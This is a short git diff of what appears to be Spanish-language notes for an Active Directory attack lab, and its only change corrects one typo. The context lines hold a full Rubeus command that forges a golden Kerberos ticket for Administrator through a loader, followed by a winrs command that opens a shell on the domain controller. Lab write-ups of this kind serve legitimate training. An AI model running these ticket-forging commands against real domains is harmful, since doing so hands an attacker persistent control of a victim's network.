@@ -54,7 +54,7 @@ Con el resultado de la ejecución tendremos que agregar el comando como argument
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 
-Tras crearlo y este ser importado tendremos que acceder a la maquina para ver nuestros privilegioa
+Tras crearlo y este ser importado tendremos que acceder a la maquina para ver nuestros privilegios
 ```shell
 winrs -r:dcorp-dc cmd
 set username
